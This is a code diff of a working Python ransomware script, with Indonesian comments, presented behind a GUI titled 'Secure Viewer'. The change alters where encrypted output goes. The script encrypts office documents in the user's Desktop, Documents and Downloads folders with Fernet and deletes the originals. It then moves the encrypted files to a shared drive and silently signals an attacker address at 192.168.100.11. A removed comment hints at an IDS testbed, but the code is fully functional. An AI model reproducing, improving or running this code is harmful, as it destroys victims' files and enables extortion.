@@ -1,61 +1,63 @@
 import os
+import shutil
 import tkinter as tk
 from tkinter import messagebox
 from cryptography.fernet import Fernet
 import requests
 
-# Path untuk simpan key dan log (disimpan di folder yang dijamin ada di Windows)
-USER_FOLDER = os.path.join(os.environ['USERPROFILE'], 'Documents')  # Aman di Windows
-
+# Lokasi aman untuk simpan kunci dan log
+USER_FOLDER = os.path.join(os.environ['USERPROFILE'], 'Documents')
 KEY_PATH = os.path.join(USER_FOLDER, "ransom_key.key")
 LOG_PATH = os.path.join(USER_FOLDER, "ransom_log.txt")
 
-# Target direktori yang ingin dienkripsi (pastikan Z: aktif)
+# Target sumber enkripsi
 TARGET_DIRS = [
     os.path.expanduser("~/Desktop"),
     os.path.expanduser("~/Documents"),
-    os.path.expanduser("~/Downloads"),
-    "Z:\\vmshare"
+    os.path.expanduser("~/Downloads")
 ]
 
-# Ekstensi file yang akan diproses
+# Folder shared tujuan
+SHARED_DEST = "Z:\\vmshare"
+
+# Ekstensi file target
 EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt', '.pptx']
 
-# Fungsi untuk membuat kunci
 def generate_key():
     key = Fernet.generate_key()
     with open(KEY_PATH, "wb") as f:
         f.write(key)
     return key
 
-# Fungsi untuk mengenkripsi file
 def encrypt_file(file_path, fernet, log_file):
     try:
         with open(file_path, "rb") as file:
             original = file.read()
         encrypted = fernet.encrypt(original)
 
-        new_path = file_path + ".enc"
+        encrypted_filename = os.path.basename(file_path) + ".enc"
+        dest_path = os.path.join(SHARED_DEST, encrypted_filename)
 
-        with open(new_path, "wb") as file:
+        with open(dest_path, "wb") as file:
             file.write(encrypted)
 
         os.remove(file_path)
-        log_file.write(f"Terenkripsi: {file_path} -> {new_path}\n")
+        log_file.write(f"Terenkripsi & Dipindah: {file_path} -> {dest_path}\n")
     except Exception as e:
-        log_file.write(f"Gagal: {file_path} | {e}\n")
+        log_file.write(f"❌ Gagal: {file_path} | {e}\n")
 
-# Fungsi untuk mengirim sinyal ke IDS (opsional)
 def notify_attacker():
     try:
         requests.get("http://192.168.100.11:8080/attack", timeout=1)
     except:
-        pass  # Supaya silent
+        pass
 
-# Fungsi utama enkripsi
 def encrypt_all():
     key = generate_key()
     fernet = Fernet(key)
+
+    if not os.path.exists(SHARED_DEST):
+        os.makedirs(SHARED_DEST)
 
     with open(LOG_PATH, "w", encoding="utf-8") as log_file:
         log_file.write("Log Enkripsi - Ransomware GUI\n")
@@ -73,9 +75,8 @@ def encrypt_all():
                         encrypt_file(full_path, fernet, log_file)
 
     notify_attacker()
-    messagebox.showinfo("Selesai", f"File berhasil dienkripsi!\nLog ada di:\n{LOG_PATH}")
+    messagebox.showinfo("Selesai", f"File berhasil dienkripsi & dipindah ke {SHARED_DEST}")
 
-# GUI
 def launch_gui():
     root = tk.Tk()
     root.title("Secure Viewer")
